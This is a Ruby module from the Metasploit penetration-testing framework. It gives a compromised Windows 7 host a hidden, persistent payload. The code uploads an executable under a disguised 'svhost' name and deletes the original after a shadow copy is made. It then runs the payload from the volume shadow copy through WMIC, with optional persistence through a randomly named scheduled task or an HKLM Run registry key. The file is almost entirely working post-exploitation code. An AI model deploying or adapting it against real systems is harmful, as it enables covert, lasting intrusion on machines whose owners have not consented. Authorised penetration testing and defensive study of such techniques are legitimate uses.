##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/shadowcopy'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'

class Metasploit4 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Registry

  def initialize(info={})

    super(update_info(info,
      'Name'                 => "Persistant Payload in Windows Volume Shadow Copy",
      'Description'          => %q{
        This module will attempt to create a persistant payload
        in new volume shadow copy.This is based on the VSSOwn
        Script originally posted by Tim Tomes and Mark Baggett.
        This module has been tested successfully on Windows 7.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['MrXors <Mr.Xors[at]gmail.com>'],
      'References'           => [
        [ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ],
        [ 'URL', 'http://www.irongeek.com/i.php?page=videos/hack3rcon2/tim-tomes-and-mark-baggett-lurking-in-the-shadows']
      ]
    ))

    register_options(
      [
        OptString.new('VOLUME', [ true, 'Volume to make a copy of.', 'C:\\']),
        OptBool.new('EXECUTE', [ true, 'Run the EXE on the remote system.', true]),
        OptBool.new('SCHTASK', [ true, 'Create a Scheduled Task for the EXE.', false]),
        OptBool.new('RUNKEY', [ true, 'Create AutoRun Key for the EXE', false]),
        OptInt.new('DELAY', [ true, 'Delay in Minutes for Reconnect attempt. Needs SCHTASK set to true to work. Default delay is 1 minute.', 1]),
        OptString.new('RPATH', [ false, 'Path on remote system to place Executable. Example: \\\\Windows\\\\Temp (DO NOT USE C:\\ in your RPATH!)', ]),
        OptPath.new('PATH', [ true, 'Path to Executable on your local system.'])
      ], self.class)

  end

  def run
    path = datastore['PATH']
    @clean_up = ""

    print_status("Checking requirements...")

    os = sysinfo['OS']
    unless os =~ /Windows 7/
      print_error("This module has been tested only on Windows 7")
      return
    end

    unless is_admin?
      print_error("This module requires admin privs to run")
      return
    end

    if is_uac_enabled?
      print_error("This module requires UAC to be bypassed first")
      return
    end

    print_status("Starting Volume Shadow Service...")
    unless start_vss
      print_error("Unable to start the Volume Shadow Service")
      return
    end

    print_status("Uploading #{path}....")
    remote_file = upload(path, datastore['RPATH'])

    print_status("Creating Shadow Volume Copy...")
    unless volume_shadow_copy
      fail_with(Failure::Unknown, "Failed to create a new shadow copy")
    end

    print_status("Deleting malware...")
    file_rm(remote_file)

    print_status("Finding the Shadow Copy Volume...")
    cmd = "cmd.exe /c vssadmin List Shadows| find \"Shadow Copy Volume\""
    volume_data_id = []
    output = cmd_exec(cmd)

    output.each_line do |line|
      cmd_regex = /HarddiskVolumeShadowCopy\d{1,9}/.match("#{line}")
      volume_data_id = "#{cmd_regex}"
    end

    if datastore["EXECUTE"]
      print_status("Executing #{remote_file}...")
      execute(volume_data_id, remote_file)
    end

    if datastore["SCHTASK"]
      print_status("Creating Scheduled Task...")
      schtasks(volume_data_id, remote_file)
    end

    if datastore["RUNKEY"]
      print_status("Installing as autorun in the registry...")
      install_registry(volume_data_id, remote_file)
    end

    unless @clean_up.empty?
      log_file
    end
  end

  def upload(file, trg_loc="")
    if trg_loc.nil? or trg_loc.empty?
      location = "\\Windows\\Temp"
    else
      location = trg_loc
    end

    file_name  = "svhost#{rand(100)}.exe"
    file_on_target = "#{location}\\#{file_name}"

    print_status("FILE ON TARGET #{file_on_target}")

    begin
      upload_file("#{file_on_target}","#{file}")
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    return file_on_target
  end

  def volume_shadow_copy
    begin
      id = create_shadowcopy(datastore['VOLUME'])
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    if id
      return true
    else
      return false
    end
  end

  def execute(volume_id, exe_path)
    run_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    cmd_exec(run_cmd)
  end

  def schtasks(volume_id, exe_path)
    sch_name = Rex::Text.rand_text_alpha(rand(8)+8)
    global_root = "\\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    sch_cmd = "cmd.exe /c %SYSTEMROOT%\\system32\\schtasks.exe /create /sc minute /mo #{datastore["DELAY"]} /tn \"#{sch_name}\" /tr #{global_root}"
    cmd_exec(sch_cmd)
    @clean_up << "execute -H -f cmd.exe -a \"/c schtasks.exe /delete /tn #{sch_name} /f\"\n"
  end

  def install_registry(volume_id, exe_path)
    global_root =  "\\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
    nam = Rex::Text.rand_text_alpha(rand(8)+8)
    hklm_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    print_status("Installing into autorun as #{hklm_key}\\#{nam}")
    res = registry_setvaldata("#{hklm_key}", nam, global_root, "REG_SZ")
    if res
      print_good("Installed into autorun as #{hklm_key}\\#{nam}")
      @clean_up << "reg  deleteval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v #{nam}\n"
    else
      print_error("Error: failed to open the registry key for writing")
    end
  end

  def clean_data
    host = session.sys.config.sysinfo["Computer"]
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
    ::FileUtils.mkdir_p(logs)
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
    return logfile
  end

  def log_file
    clean_rc = clean_data()
    file_local_write(clean_rc, @clean_up)
    print_status("Cleanup Meterpreter RC File: #{clean_rc}")
  end

end
